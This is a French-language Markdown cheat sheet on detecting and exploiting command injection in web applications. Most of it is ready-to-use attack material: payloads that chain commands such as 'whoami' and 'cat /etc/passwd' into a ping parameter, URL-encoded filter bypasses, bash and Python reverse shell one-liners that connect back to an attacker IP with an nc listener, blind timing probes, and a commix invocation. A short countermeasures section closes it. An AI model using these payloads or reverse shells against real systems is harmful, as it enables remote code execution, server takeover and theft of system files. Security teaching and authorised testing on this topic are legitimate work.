# 💣 Command Injection - Cheatsheet Cyber

Ce fichier détaille comment identifier et exploiter une **command injection** sur une application web, et comment automatiser ou escalader cette vulnérabilité.

---

## ❓ 1. Qu’est-ce qu’une Command Injection ?

Une Command Injection (injection de commande) survient lorsque les **données d’entrée utilisateur** sont utilisées **directement dans une commande système** sans filtrage, permettant à un attaquant d’exécuter des commandes arbitraires sur le serveur.

---

## 🔍 2. Étapes de détection

### Identifier les fonctionnalités sensibles

Chercher :

- Formulaires avec ping, traceroute, lookup, upload
- Paramètres comme `ip=`, `host=`, `cmd=`

Exemple d’URL :

http://site.com/ping?ip=127.0.0.1
> Suspect si l'entrée est utilisée dans une commande shell.

### Tester une simple injection

Ajouter `;` ou `&&` pour injecter une commande :

127.0.0.1; whoami  
127.0.0.1 && whoami  
127.0.0.1 | whoami  
127.0.0.1 $(whoami)  
127.0.0.1 `whoami`  

> Si la réponse inclut un résultat inattendu ou une erreur, c’est vulnérable.

---

## 🧪 3. Exemples de payloads

### Standard

127.0.0.1; ls  
127.0.0.1 && cat /etc/passwd  
127.0.0.1 | id  

> Exécute des commandes classiques UNIX si interprété par bash/sh

### Encodage / bypass

URL encode les caractères :

127.0.0.1%26%26whoami  
127.0.0.1%3Bcat%20/etc/passwd  

> Utile pour contourner les protections simples

---

## 📡 4. Exploitation - Reverse Shell

### Bash (Linux)

127.0.0.1; bash -i >& /dev/tcp/IP/PORT 0>&1  

### Python

127.0.0.1; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'  

> Nécessite un `nc -lvnp PORT` sur l’attaquant

---

## 🪪 5. Détection Blind (Command Injection aveugle)

### Indice : aucune réponse dans la page web

Injecter :

127.0.0.1 && ping -c 3 127.0.0.1  
127.0.0.1 && sleep 5  

> Si le site **ralentit** ou **met plus de temps**, c’est probablement vulnérable.

---

## 🤖 6. Outils automatisés

- `commix`  
> Outil automatisé pour détecter/exploiter les injections de commandes.
- commix --url="http://site.com/ping?ip=127.0.0.1" --level=2

- `wfuzz`, `ffuf`  
> Fuzz de paramètres avec séparateurs `;`, `|`, `&&` etc.

---

## 🛡 7. Contre-mesures

- Ne **jamais concaténer** des entrées utilisateur dans une commande système
- Utiliser des appels système sécurisés (ex: `subprocess.run([...], shell=False)`)
- Filtrer les caractères spéciaux `; | & \` $ ( ) < >`
- Échapper les arguments et valider strictement l’entrée

---

## 📌 Ressources utiles

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://book.hacktricks.xyz/pentesting-web/command-injection
